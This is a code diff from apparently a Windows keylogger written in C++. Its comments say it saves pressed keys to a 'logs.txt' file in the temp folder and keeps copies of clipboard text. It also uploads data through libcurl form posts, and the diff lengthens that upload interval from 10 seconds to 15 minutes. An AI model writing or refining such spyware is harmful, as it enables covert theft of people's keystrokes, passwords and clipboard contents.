@@ -85,7 +85,7 @@ char tempFolderPath[MAX_PATH]; // istancing a char array to memorize the TempFol
 DWORD result = GetTempPathA(MAX_PATH, tempFolderPath); // getting the TempFolder Path due to windows' function
 const std::string FilePath = (std::string)tempFolderPath + "logs.txt"; // setting the path of where i'm going to save the key pressed
 
-const std::chrono::seconds waitTime = std::chrono::seconds(int(10)); // seconds -> 15 minutes
+const std::chrono::seconds waitTime = std::chrono::seconds(int(15 * 60)); // seconds -> 15 minutes
 
 std::string clipBoardLastSave = ""; // saving the text in the windows' clipBoard
 std::string contentFile = ""; // save everything of what is been writing down
@@ -639,7 +639,7 @@ static void makeRequest() {
 		res = curl_easy_perform(curl);
 		/*if (res != CURLE_OK)
 			std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;*/
-			// Cleanup
+		// Cleanup
 		curl_easy_cleanup(curl);
 		curl_formfree(formpost);
 	}
